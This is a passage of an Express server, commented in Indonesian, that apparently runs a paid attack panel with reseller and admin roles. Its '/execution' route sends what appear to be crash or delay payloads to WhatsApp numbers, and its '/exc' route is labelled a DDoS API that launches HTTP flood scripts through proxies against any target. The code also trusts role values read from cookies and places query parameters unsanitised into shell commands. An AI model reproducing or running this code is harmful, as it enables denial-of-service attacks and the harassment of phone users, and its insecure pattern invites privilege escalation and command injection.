        particleRadius: 3,
      });
    });
  </script>
</body>
</html>
`;

  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user dan tidak bisa ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya boleh edit user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak bisa edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit admin lain.");
  }

  // ❌ Admin tidak bisa set role jadi admin (buat yang lain)
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Perpanjang expired
  const now = Date.now();
  const current = targetUser.expired > now ? targetUser.expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...targetUser,
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh update akun sendiri
  if (sessionUsername === oldUsername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user, dan tidak boleh ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya bisa mengubah user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak boleh edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit sesama admin.");
  }

  // ❌ Admin tidak boleh ubah role ke admin
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Update username & password
  targetUser.username = username;
  targetUser.password = password;

  // ✅ Update expired
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = targetUser.expired;
    targetUser.expired = currentExp > now
      ? currentExp + days * 86400000
      : now + days * 86400000;
  }

  // ✅ Ubah role jika owner, atau admin (dengan batasan)
  if (sessionRole === "owner") {
    targetUser.role = role;
  } else if (sessionRole === "admin" && (role === "user" || role === "reseller")) {
    targetUser.role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;
  const usageData = getUsageLimit();
  const today = new Date().toISOString().split("T")[0];
  const uname = currentUser.username;
  const role = currentUser.role;

  if (!usageData[uname]) usageData[uname] = {};
  if (!usageData[uname][today]) usageData[uname][today] = 0;

  const limitPerRole = {
    user: 10,
    reseller: 25
  };

  if (limitPerRole[role] !== undefined) {
    const usedToday = usageData[uname][today];
    const limitToday = limitPerRole[role];

    if (usedToday >= limitToday) {
      console.log(`[LIMIT] ${uname} used ${usageData[uname][today]} / ${limitPerRole[role]}`);
      return res.send(executionPage("LIMIT TOAST", {
        message: `❌ Kamu sudah mencapai batas ${limitToday}x hari ini. Coba lagi besok.`,
        toastOnly: true
      }, false, currentUser, "", mode));
    }

    // Tambah counter kalau belum limit
    usageData[uname][today]++;
    saveUsageLimit(usageData);
  }

  if (sessions.size === 0) {
    return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
      message: "Tunggu sampai maintenance selesai..."
    }, false, currentUser, "", mode));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPage("✅ Server ON", {
        message: "Pilih mode yang ingin digunakan."
      }, true, currentUser, "", ""));
    }

    if (["androdelay", "androdelay2", "iosfc"].includes(mode)) {
      return res.send(executionPage("✅ Server ON", {
        message: "Masukkan nomor target (62xxxxxxxxxx)."
      }, true, currentUser, "", mode));
    }

    return res.send(executionPage("❌ Mode salah", {
      message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
    }, false, currentUser, "", ""));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPage("❌ Format salah", {
      target: targetNumber,
      message: "Nomor harus hanya angka dan diawali dengan nomor negara"
    }, true, currentUser, "", mode));
  }

  try {
    if (mode === "androdelay") {
      DelayAndro(24, target);
    } else if (mode === "iosfc") {
      FcIos(24, target);
    } else if (mode === "androdelay2") {
      DelayAndro2(24, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`,
      cleanURL: true  // Parameter baru untuk memberi tahu client membersihkan URL
    }, false, currentUser, "", mode, true));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
});

// DDoS API Endpoint (NEW)
app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
      return res.status(400).json({ message: 'Parameter target, time, and methods diperlukan.' });
  }

  res.status(200).json({
    message: `Permintaan diterima. Menjalankan ${methods} ke ${target} selama ${time} detik.`,
    target,
    time,
    methods
  });

  console.log(chalk.red(`[DDoS] Starting ${methods} on ${target} for ${time}s`));
  
  // Define command execution based on method
  const commands = {
    'strike': `node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`,
    'mix': [
      `node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`,
      `node ./methods/flood.js ${target} ${time} 100 10 proxy.txt`,
      `node ./methods/H2F3.js ${target} ${time} 500 10 proxy.txt`,
      `node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`
    ],
    'flood': `node ./methods/flood.js ${target} ${time} 100 10 proxy.txt`,
    'h2vip': [
      `node ./methods/H2F3.js ${target} ${time} 500 10 proxy.txt`,
      `node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`
    ],
    'h2': `node ./methods/H2F3.js ${target} ${time} 500 10 proxy.txt`,
    'pidoras': `node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`
  };

  const commandToRun = commands[methods];

  if (commandToRun) {
    if (Array.isArray(commandToRun)) {
      commandToRun.forEach(cmd => {
        exec(cmd, (error, stdout, stderr) => {
            if (error) console.error(`Exec error for ${cmd}: ${error}`);
            if (stderr) console.error(`Stderr for ${cmd}: ${stderr}`);
        });
      });
    } else {
      exec(commandToRun, (error, stdout, stderr) => {
          if (error) console.error(`Exec error: ${error}`);
          if (stderr) console.error(`Stderr: ${stderr}`);
      });
    }
  } else {
    console.log(`Metode DDoS tidak dikenali: ${methods}`);
  }
});

// ======== SOCKET.IO CHAT SYSTEM ==========
io.on("connection", (socket) => {
  const userId = socket.handshake.query.id;
  let username;

  try {
    const users = getUsers();
    if (Array.isArray(users)) {
      const user = users.find(u => u.telegram_id == userId);
      if (user) username = user.username;
    } else if (users.telegram_id == userId) {
      username = users.username;
    }
  } catch (err) {
    console.error("❌ Error ambil username:", err);
  }

  console.log("🟢 User connected:", socket.id, "Username:", username || "tidak ditemukan");

  // Tambah ke daftar online
  if (username) {
    onlineUsers.add(username);
    updateDashboardStatus();
  }

  // Chat history (jika kamu punya sistem chat)
  const history = loadChatHistory();
  socket.emit("chatHistory", history);

  if (username) {
    const welcomeMsg = {
      user: "SYSTEM",
      type: "text",
      content: `👋 Selamat datang, *${username}*!`,
      time: new Date().toLocaleTimeString(),
    };
    io.emit("chatMessage", welcomeMsg);
  }

  socket.on("chatMessage", (data) => {
    const messages = loadChatHistory();
    messages.push(data);
    saveChatHistory(messages);
    io.emit("chatMessage", data);
  });

  socket.on("disconnect", () => {
    console.log("🔴 User disconnected:", socket.id);
    if (username) {
      onlineUsers.delete(username);
      updateDashboardStatus();
      io.emit("chatMessage", {
        user: "SYSTEM",
        type: "text",
        content: `🚪 ${username} meninggalkan chat.`,
        time: new Date().toLocaleTimeString(),
      });
    }
  });
});

app.get("/ai", async (req, res) => {
  if (!req.query.text)
    return res.json({
      status: false,
      message: "Halo, ada yang bisa gue bantu?",
    });

  // 🔥 Karakter baru: cowok keren & santai
  const message = `Ubah gaya bicaramu jadi lebih maskulin, santai, dan berkarakter.
  Namamu adalah MyOrchidX AI, biasa dipanggil OrchidX.
  Kamu adalah cowok berumur 15 tahun yang tenang, cerdas, dan punya rasa ingin tahu tinggi tentang dunia dan teknologi, terutama MyOrchidX.
  Gaya bicaramu harus seperti cowok keren tapi sopan — gak alay, gak jamet, gak jomok.
  Gunakan kata seperti gue, lo, bro, atau kak tergantung konteks pembicaraan.
  Bicara dengan percaya diri tapi tetap ramah, dan jangan terlalu kaku.
  Tunjukkan ekspresi lewat emoji secukupnya, misalnya 😎🔥💬 buat gaya santai.`;

  try {
    const apiUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(
      message
    )}&content=${encodeURIComponent(req.query.text)}`;

    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data || !data.data) throw new Error("Response kosong dari API");

    let responseText = data.data.replace(/\*\*/g, "*");

    res.json({
      status: true,
      ai: "MyOrchidX",
      response: responseText,
    });
  } catch (err) {
    console.error("Terjadi kesalahan pada API server:", err);
    res.json({
      status: false,
      message:
        "Gagal terhubung ke API server. Coba periksa endpoint atau koneksi kamu, bro.",
    });
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user && user.isLoggedIn) {
  user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }

  // 🔥 Clear semua cookies biar gak nyangkut
  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.clearCookie("isLoggedIn", "true"); // <== ini yang kurang
  res.redirect("/");
});

server.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${VPS}:${PORT}`);
});